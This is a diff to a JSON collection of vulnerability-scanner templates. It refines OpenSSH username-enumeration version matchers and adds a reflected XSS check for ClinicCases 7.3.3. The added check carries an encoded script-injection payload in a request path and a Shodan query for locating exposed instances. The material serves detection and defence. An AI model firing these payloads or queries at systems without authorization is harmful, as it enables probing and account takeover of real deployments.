@@ -10997,35 +10997,44 @@
     {
       "id": "CVE-2016-6210",
       "info": {
-        "author": "iamthefrogy",
+        "author": "iamthefrogy,forgedhallpass",
         "classification": {
           "cve-id": "CVE-2016-6210",
           "cvss-metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
           "cvss-score": 5.9,
           "cwe-id": "CWE-200"
         },
-        "description": "OpenSSH 5.3 is vulnerable to username enumeration and DoS vulnerabilities.",
-        "name": "OpenSSH 5.3 Detection",
+        "description": "OpenSSH before 7.3 is vulnerable to username enumeration and DoS vulnerabilities.",
+        "name": "OpenSSH username enumeration < v7.3",
         "reference": [
           "http://seclists.org/fulldisclosure/2016/Jul/51",
           "https://security-tracker.debian.org/tracker/CVE-2016-6210",
-          "http://openwall.com/lists/oss-security/2016/08/01/2"
+          "http://openwall.com/lists/oss-security/2016/08/01/2",
+          "https://nvd.nist.gov/vuln/detail/CVE-2016-6210"
         ],
         "severity": "medium",
         "tags": "network,openssh"
       },
       "network": [
         {
+          "extractors": [
+            {
+              "regex": [
+                "(?i)SSH-2.0-OpenSSH_[^\\r]+"
+              ],
+              "type": "regex"
+            }
+          ],
           "host": [
             "{{Hostname}}",
             "{{Hostname}}:22"
           ],
           "matchers": [
             {
-              "type": "word",
-              "words": [
-                "SSH-2.0-OpenSSH_5.3"
-              ]
+              "regex": [
+                "(?i)SSH-2.0-OpenSSH_(?:[1-6][^\\d][^\\r]+|7\\.[0-2][^\\d][^\\r]+)"
+              ],
+              "type": "regex"
             }
           ]
         }
@@ -15197,7 +15206,7 @@
     {
       "id": "CVE-2018-15473",
       "info": {
-        "author": "r3dg33k,daffainfo",
+        "author": "r3dg33k,daffainfo,forgedhallpass",
         "classification": {
           "cve-id": "CVE-2018-15473",
           "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
@@ -15205,7 +15214,7 @@
           "cwe-id": "CWE-362"
         },
         "description": "OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.",
-        "name": "OpenSSH Username Enumeration",
+        "name": "OpenSSH Username Enumeration <= v7.7",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-15473",
         "severity": "medium",
         "tags": "network,openssh,cve,cve2018"
@@ -15215,7 +15224,7 @@
           "extractors": [
             {
               "regex": [
-                "SSH-2.0-OpenSSH_([0-9.]+)"
+                "(?i)SSH-2.0-OpenSSH_[^\\r]+"
               ],
               "type": "regex"
             }
@@ -15227,7 +15236,7 @@
           "matchers": [
             {
               "regex": [
-                "SSH-2.0-OpenSSH_[1-7]"
+                "(?i)SSH-2.0-OpenSSH_(?:[1-6][^\\d][^\\r]+|7\\.[0-7][^\\d][^\\r]+)"
               ],
               "type": "regex"
             }
@@ -36718,6 +36727,60 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-38704",
+      "info": {
+        "author": "alph4byt3",
+        "classification": {
+          "cve-id": "CVE-2021-38704",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Multiple reflected cross-site scripting (XSS) vulnerabilities in ClinicCases 7.3.3 allow unauthenticated attackers to introduce arbitrary JavaScript by crafting a malicious URL. This can result in account takeover via session token theft.",
+        "metadata": {
+          "shodan-query": "http.title:\"ClinicCases\",html:\"/cliniccases/\""
+        },
+        "name": "ClinicCases 7.3.3 Reflected Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://github.com/sudonoodle/CVE-2021-38704",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-38704"
+        ],
+        "severity": "medium",
+        "tags": "xss,cve,cve2021,cliniccases"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cliniccases/lib/php/data/messages_load.php?type=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
